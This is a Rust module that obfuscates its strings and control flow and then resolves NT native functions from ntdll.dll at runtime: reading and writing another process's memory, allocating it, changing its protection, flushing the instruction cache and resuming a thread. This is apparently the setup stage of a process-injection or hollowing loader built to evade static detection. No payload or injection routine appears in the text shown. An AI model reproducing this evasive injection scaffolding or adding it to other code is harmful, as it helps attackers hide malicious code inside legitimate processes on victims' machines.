use std::mem::transmute;
use once_cell::sync::Lazy;
use std::ffi::c_void;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
use obfuscator::{obfuscate, obfuscate_string};

type NtQueryInformationProcess = extern "system" fn(
ProcessHandle: *mut c_void,
ProcessInformationClass: PROCESS_INFORMATION_CLASS,
ProcessInformation: *mut c_void,
ProcessInformationLength: u32,
ReturnLength: *mut u32,
) -> i32;
type NtClose = extern "system" fn(Handle: *mut c_void) -> i32;
type NtReadVirtualMemory = extern "system" fn(
ProcessHandle: *mut c_void,
BaseAddress: *mut c_void,
Buffer: *mut c_void,
NumberOfBytesToRead: usize,
NumberOfBytesRead: *mut usize,
) -> i32;
type NtWriteVirtualMemory = extern "system" fn(
ProcessHandle: *mut c_void,
BaseAddress: *mut c_void,
Buffer: *mut c_void,
NumberOfBytesToWrite: usize,
NumberOfBytesWritten: *mut usize,
) -> i32;
type NtResumeThread = extern "system" fn(
    ThreadHandle: *mut c_void,
    SuspendCount: *mut u32,
) -> i32;

type NtAllocateVirtualMemory = extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

type NtProtectVirtualMemory = extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    NewProtect: u32,
    OldProtect: *mut u32,
) -> i32;

type NtFlushInstructionCache = extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut c_void,
    RegionSize: usize,
) -> i32;

#[derive(Clone)]
pub struct Syscalls {
    pub NtQueryInformationProcess: NtQueryInformationProcess,
    pub NtClose: NtClose,
    pub NtReadVirtualMemory: NtReadVirtualMemory,
    pub NtWriteVirtualMemory: NtWriteVirtualMemory,
    pub NtResumeThread: NtResumeThread,
    pub NtAllocateVirtualMemory: NtAllocateVirtualMemory,
    pub NtProtectVirtualMemory: NtProtectVirtualMemory,
    pub NtFlushInstructionCache: NtFlushInstructionCache,
}

impl Syscalls {
    #[obfuscate(garbage = true, control_f = true)]
    fn new() -> Result<Syscalls, &'static str> {
        unsafe {
            let ntdll_str = obfuscate_string!("ntdll.dll\0");
            let ntdll = LoadLibraryA(ntdll_str.as_ptr());
            if (ntdll as *mut std::ffi::c_void).is_null() {
                return Err("Failed to load ntdll.dll");
            }

            let nt_query_info_proc_str = obfuscate_string!("NtQueryInformationProcess\0");
            let nt_close_str = obfuscate_string!("NtClose\0");
            let nt_read_virt_mem_str = obfuscate_string!("NtReadVirtualMemory\0");
            let nt_write_virt_mem_str = obfuscate_string!("NtWriteVirtualMemory\0");
            let nt_resume_thread_str = obfuscate_string!("NtResumeThread\0");
            let nt_alloc_virt_mem_str = obfuscate_string!("NtAllocateVirtualMemory\0");
            let nt_protect_virt_mem_str = obfuscate_string!("NtProtectVirtualMemory\0");
            let nt_flush_inst_cache_str = obfuscate_string!("NtFlushInstructionCache\0");

            let NtQueryInformationProcess = GetProcAddress(ntdll, nt_query_info_proc_str.as_ptr());
            let NtClose = GetProcAddress(ntdll, nt_close_str.as_ptr());
            let NtReadVirtualMemory = GetProcAddress(ntdll, nt_read_virt_mem_str.as_ptr());
            let NtWriteVirtualMemory = GetProcAddress(ntdll, nt_write_virt_mem_str.as_ptr());
            let NtResumeThread = GetProcAddress(ntdll, nt_resume_thread_str.as_ptr());
            let NtAllocateVirtualMemory = GetProcAddress(ntdll, nt_alloc_virt_mem_str.as_ptr());
            let NtProtectVirtualMemory = GetProcAddress(ntdll, nt_protect_virt_mem_str.as_ptr());
            let NtFlushInstructionCache = GetProcAddress(ntdll, nt_flush_inst_cache_str.as_ptr());
            if NtQueryInformationProcess.is_none()
                || NtClose.is_none()
                || NtReadVirtualMemory.is_none()
                || NtWriteVirtualMemory.is_none()
                || NtResumeThread.is_none()
                || NtAllocateVirtualMemory.is_none()
                || NtProtectVirtualMemory.is_none()
                || NtFlushInstructionCache.is_none()
            {
                return Err("Failed to get one or more function addresses");
            }

            Ok(Syscalls {
                NtQueryInformationProcess: transmute(NtQueryInformationProcess.unwrap()),
                NtClose: transmute(NtClose.unwrap()),
                NtReadVirtualMemory: transmute(NtReadVirtualMemory.unwrap()),
                NtWriteVirtualMemory: transmute(NtWriteVirtualMemory.unwrap()),
                NtResumeThread: transmute(NtResumeThread.unwrap()),
                NtAllocateVirtualMemory: transmute(NtAllocateVirtualMemory.unwrap()),
                NtProtectVirtualMemory: transmute(NtProtectVirtualMemory.unwrap()),
                NtFlushInstructionCache: transmute(NtFlushInstructionCache.unwrap()),
            })
        }
    }
}
pub static SYSCALLS: Lazy<Syscalls> = Lazy::new(|| {
    Syscalls::new().expect("")
});
